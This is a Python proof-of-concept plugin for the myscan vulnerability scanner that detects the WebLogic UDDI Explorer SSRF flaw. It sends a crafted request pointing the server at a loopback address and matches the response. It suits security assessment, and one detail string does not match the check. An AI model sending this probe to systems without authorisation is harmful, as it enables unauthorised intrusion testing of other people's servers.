#!/usr/bin/env python3
# @Time    : 2020-04-26
# @Author  : caicai
# @File    : poc_weblogic_ssrf_2018.py


from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.helper.helper_socket import socket_send_withssl, socket_send  # 如果需要，socket的方法封装
from myscan.config import scan_set
import time

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "weblogic ssrf"
        self.vulmsg = "ssrf ,see it : https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        for _ in range(2):

            req = {
                "method": "GET",
                "url": self.url + "uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700",
                "headers": {
                    "Cookie": "publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|;",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169"
                },
                "allow_redirects": False,
                "timeout": 10,
                "verify": False,
            }
            r = request(**req)
            if r != None and r.status_code == 200:
                if b"<TITLE>Deploying Application</TITLE>" in r.content:
                    time.sleep(10)
                    continue
                if b"&#39;127.1.1.1&#39;, port: &#39;700&#39;" in r.content or b"Socket Closed" in r.content:
                    parser_ = response_parser(r)
                    self.result.append({
                        "name": self.name,
                        "url": parser_.geturl(),
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "others": "225773091 in response",
                            "request": parser_.getrequestraw(),
                            "response": parser_.getresponseraw()
                        }
                    })
                    return
